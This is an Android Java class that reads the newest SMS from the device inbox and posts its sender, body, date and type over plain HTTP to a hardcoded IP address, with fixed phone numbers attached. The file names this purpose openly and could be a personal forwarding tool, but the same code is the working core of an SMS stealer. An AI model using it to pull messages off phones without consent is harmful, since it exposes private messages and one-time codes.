package com.warmme.smshandler;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.ProtocolException;
import java.net.URL;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.text.SimpleDateFormat;
import java.util.Date;

import javax.net.ssl.KeyManager;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;

/**
 * 短信发送者
 */
public class SmsHandler {

    private static final String TAG = "SmsHandler";

    /**
     * 异步发送短信内容到服务器
     *
     * @return
     * @throws IOException
     */
    public static String sendSmsAsy(final String body) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                sendSms(body);
            }
        }).start();
        return "succeed";
    }

    /**
     * 异步发送短信内容到服务器
     *
     * @return
     * @throws IOException
     */
    public static String sendSmsAsy(Context context) {
        final String body = getSMS(context);
        new Thread(new Runnable() {
            @Override
            public void run() {
                sendSms(body);
            }
        }).start();
        return "succeed";
    }

    /**
     * 异步发送短信内容到服务器
     *
     * @return
     * @throws IOException
     */
    public static String sendSms(Context context) {
        final String body = getSMS(context);
        sendSms(body);
        return "succeed";
    }

    /**
     * 发送短信内容到服务器
     *
     * @return
     * @throws IOException
     */
    public static String sendSms(String body) {
        Log.d(TAG, "sendSms: 进来了");
        URL url = null;
        InputStream stream = null;
        HttpURLConnection connection = null;
        String result = null;
        try {
            url = new URL("http", "120.78.93.52", 80, "sms/sms");
            connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setUseCaches(false);
            // 设置请求方式（GET/POST）
            connection.setRequestMethod("POST");
            //请求的内容为表单类型数据
            connection.setRequestProperty("Content-Type", "application/json;charset=utf-8");
            // Timeout for reading InputStream arbitrarily set to 3000ms.
            connection.setReadTimeout(3000);
            // Timeout for connection.connect() arbitrarily set to 3000ms.
            connection.setConnectTimeout(3000);
            // Open communications link (network traffic occurs here).
            connection.connect();
            OutputStream outStrm = connection.getOutputStream();
            ObjectOutputStream objOutputStrm = new ObjectOutputStream(outStrm);
            objOutputStrm.writeObject(new String(smsJson(body)));
            objOutputStrm.flush();
            objOutputStrm.close();
            int responseCode = connection.getResponseCode();
            if (responseCode != HttpURLConnection.HTTP_OK) {
                throw new IOException("HTTP error code: " + responseCode);
            }
            // Retrieve the response body as an InputStream.
            stream = connection.getInputStream();

            if (stream != null) {
                // Converts Stream to String with max length of 500.
//                result = readStream(stream, 500);
            }
        } catch (ProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            // Close Stream and disconnect HTTPS connection.
            if (stream != null) {
                try {
                    stream.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (connection != null) {
                connection.disconnect();
            }
        }
        return result;
    }

    public static String smsJson(String body) {
        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("msg", body);
            jsonObject.put("receiveTime", System.currentTimeMillis());
            jsonObject.put("senderPhone", "10068855");
            jsonObject.put("receiverPhone", "18575582923");
            jsonObject.put("storTime", System.currentTimeMillis());
        } catch (JSONException e) {
            e.printStackTrace();
            Log.d(TAG, "smsJson: " + e.getMessage());
        }
        String b = jsonObject.toString();
        if (b.contains("{")) {
            b = b.substring(b.indexOf("{"), b.length());
        }
        return jsonObject.toString();
    }


    public static String getSMS(Context context) {
        final String SMS_URI_INBOX = "content://sms";

        String address = "18575582923";
        Uri uri = Uri.parse(SMS_URI_INBOX);

        String[] projection = new String[]{"_id", "address", "person", "body", "date", "type",};
//        Cursor cursor = getContentResolver().query(uri, projection, null, null, "date desc");
        ContentResolver cr = context.getContentResolver();
        context.grantUriPermission("com.warmme.smshandler", uri, Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);
        Cursor cur = cr.query(uri, projection, "0 = 0", null, "date desc");
        StringBuilder smsBuilder = new StringBuilder();


        if (cur.moveToFirst()) {
            int index_Address = cur.getColumnIndex("address");
            int index_Person = cur.getColumnIndex("person");
            int index_Body = cur.getColumnIndex("body");
            int index_Date = cur.getColumnIndex("date");
            int index_Type = cur.getColumnIndex("type");

            String strAddress = cur.getString(index_Address);
            int intPerson = cur.getInt(index_Person);
            String strbody = cur.getString(index_Body);
            long longDate = cur.getLong(index_Date);

            int intType = cur.getInt(index_Type);

            SimpleDateFormat dateFormat = new SimpleDateFormat(
                    "yyyy-MM-dd hh:mm:ss");
            Date d = new Date(longDate);
            String strDate = dateFormat.format(d);

            String strType = "";
            if (intType == 1) {
                strType = "接收";
            } else if (intType == 2) {
                strType = "发送";
            } else if (intType == 3) {
                strType = "草稿";
            } else if (intType == 4) {
                strType = "发件箱";
            } else if (intType == 5) {
                strType = "发送失败";
            } else if (intType == 6) {
                strType = "待发送列表";
            } else if (intType == 0) {
                strType = "所以短信";
            } else {
                strType = "null";
            }

//                if(strAddress.equals(address)){
            smsBuilder.append("[ ");
            smsBuilder.append(strAddress + ", ");
            smsBuilder.append(intPerson + ", ");
            smsBuilder.append(strbody + ", ");
            smsBuilder.append(strDate + ", ");
            smsBuilder.append(strType);
            smsBuilder.append(" ]\n\n");
            smsBuilder.append("columnNames:::==>" + cur.getColumnNames());
//                }


 /*           do {
                String strAddress = cur.getString(index_Address);
                int intPerson = cur.getInt(index_Person);
                String strbody = cur.getString(index_Body);
                long longDate = cur.getLong(index_Date);
                int intType = cur.getInt(index_Type);

                SimpleDateFormat dateFormat = new SimpleDateFormat(
                        "yyyy-MM-dd hh:mm:ss");
                Date d = new Date(longDate);
                String strDate = dateFormat.format(d);

                String strType = "";
                if (intType == 1) {
                    strType = "接收";
                } else if (intType == 2) {
                    strType = "发送";
                } else if (intType == 3) {
                    strType = "草稿";
                } else if (intType == 4) {
                    strType = "发件箱";
                } else if (intType == 5) {
                    strType = "发送失败";
                } else if (intType == 6) {
                    strType = "待发送列表";
                } else if (intType == 0) {
                    strType = "所以短信";
                } else {
                    strType = "null";
                }

//                if(strAddress.equals(address)){
                    smsBuilder.append("[ ");
                    smsBuilder.append(strAddress + ", ");
                    smsBuilder.append(intPerson + ", ");
                    smsBuilder.append(strbody + ", ");
                    smsBuilder.append(strDate + ", ");
                    smsBuilder.append(strType);
                    smsBuilder.append(" ]\n\n");
//                }

            } while (cur.moveToNext());
*/
            if (!cur.isClosed()) {
                cur.close();
                cur = null;
            }
        } else {
            smsBuilder.append("no result!");
        }


        smsBuilder.append("getSmsInPhone has executed!");

        return smsBuilder.toString();
    }


}
